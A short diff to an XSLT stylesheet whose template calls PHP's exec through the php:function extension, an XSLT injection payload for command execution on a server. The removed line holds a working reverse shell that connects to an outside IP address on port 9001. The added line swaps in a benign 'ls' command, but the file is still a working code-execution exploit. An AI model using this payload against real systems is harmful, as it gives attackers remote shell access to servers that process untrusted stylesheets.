@@ -1,5 +1,5 @@
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
   <xsl:template match="/">
-    <xsl:value-of select="php:function('exec', 'sh -i >& /dev/tcp/85.68.24.100/9001 0>&1')"/>
+    <xsl:value-of select="php:function('exec', 'ls')"/>
   </xsl:template>
 </xsl:stylesheet>
